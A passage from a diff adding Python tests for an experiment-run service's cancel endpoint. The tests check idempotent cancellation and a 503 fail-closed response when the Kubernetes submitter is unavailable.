+    run_id = created.json()['run_id']
+
+    cancelled = client.post(f'/runs/{run_id}/cancel')
+
+    assert cancelled.status_code == 200
+    assert cancelled.json()['status']['status'] == 'cancelled'
+    assert submitter.cancelled == [run_id]
+    assert client.get(f'/runs/{run_id}').json()['status']['status'] == 'cancelled'
+
+    repeated = client.post(f'/runs/{run_id}/cancel')
+    assert repeated.status_code == 200
+    assert submitter.cancelled == [run_id]
+
+
+def test_cancel_run_does_not_persist_cancelled_when_submitter_fails() -> None:
+    class FailingSubmitter(NullJobSubmitter):
+        def cancel_run(self, record) -> None:
+            raise LiveStatusUnavailableError('Kubernetes unavailable')
+
+    client = build_legacy_compatibility_client(
+        submitter=FailingSubmitter(namespace='default')
+    )
+    created = client.post(
+        '/experiments/runs',
+        json={
+            'objective': 'Fail closed during cancellation.',
+            'experiment_type': 'gpu-training-job',
+            'workload_id': 'metric-search-v0',
+            'config_payload': {'search_space_id': 'art-metric-baseline'},
+            'dataset_bindings': {'train_uri': 's3://datasets/art/train.parquet'},
+            'budget': {'max_epochs': 1, 'max_wallclock_minutes': 5},
+            'submitted_by': 'test-suite',
+        },
+    )
+    run_id = created.json()['run_id']
+
+    cancelled = client.post(f'/runs/{run_id}/cancel')
+
+    assert cancelled.status_code == 503
+    assert client.get(f'/runs/{run_id}').json()['status']['status'] != 'cancelled'
